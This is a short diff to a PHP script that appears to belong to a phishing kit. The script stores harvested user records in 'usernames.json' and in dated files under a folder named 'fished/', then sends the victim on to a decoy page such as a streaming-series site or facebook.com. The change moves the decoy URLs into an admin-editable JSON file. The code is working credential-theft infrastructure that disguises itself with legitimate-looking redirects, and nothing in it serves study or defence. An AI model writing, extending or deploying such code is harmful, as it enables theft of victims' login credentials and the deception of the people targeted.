@@ -51,10 +51,14 @@ file_put_contents("usernames.json", json_encode($usuarios , JSON_PRETTY_PRINT) )
 
 file_put_contents('fished/' . date('Y-m-d') . '.txt', json_encode($usuario) . "\n----\n", FILE_APPEND | LOCK_EX);
 
-if($_POST['video'] == 'ec4f4ae3') {
-    header('Location: https://cuevana3.io/serie/what-if');
+$urls = json_decode(file_get_contents( 'admin/php/url.json'), true);
+
+
+if(array_key_exists($_POST['video'], $urls )) {
+    $url  = $urls[$_POST['video']];
+    header('Location: '.$url);
 } else {
-    header('Location: https://www.facebook.com');
+    header('Location: https://facebook.com');
 }
 
 exit();
